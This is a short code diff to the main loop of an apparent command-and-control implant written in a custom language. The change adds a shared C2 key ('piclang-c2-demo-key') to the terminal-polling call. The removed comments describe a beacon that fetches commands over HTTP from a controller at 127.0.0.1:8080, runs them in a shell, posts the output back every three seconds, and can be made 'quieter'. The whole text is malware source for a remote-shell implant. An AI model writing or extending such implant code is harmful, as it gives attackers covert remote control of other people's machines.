@@ -16,18 +16,17 @@ fn main(stackHint: *void) -> u64 {
         return 2
     }
 
-    // Cleartext HTTP only (std/net has no TLS).
     var c2Base: *u8 = "http://127.0.0.1:8080"
+    var c2Key: *u8 = "piclang-c2-demo-key"
+    var keyLen: u64 = __strlen(c2Key)
 
     id, err := c2.GetAgentID()
     if err != 0 {
         return 3
     }
 
-    // Beacon loop: GET /v1/terminal/{id} -> shell -> POST output -> sleep.
-    // Poll every 3s (raise for quieter implants).
     for true {
-        c2.PollTerminal(c2Base, id)
+        c2.PollTerminal(c2Base, id, c2Key, keyLen)
         time.Sleep(3 * time.Second)
     }
 
